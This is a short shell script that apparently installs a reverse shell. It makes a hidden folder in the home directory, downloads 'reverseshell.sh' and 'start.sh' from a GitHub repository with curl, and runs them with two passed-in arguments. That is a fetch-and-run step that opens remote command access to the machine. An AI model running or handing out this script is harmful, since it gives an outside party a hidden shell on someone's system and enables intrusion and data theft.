cd ~
mkdir .reverse_shell_mmob
cd .reverse_shell_mmob
curl -o reverseshell.sh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/reverseshell.sh
curl -o start.sh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.sh
sh start.sh $1 $2
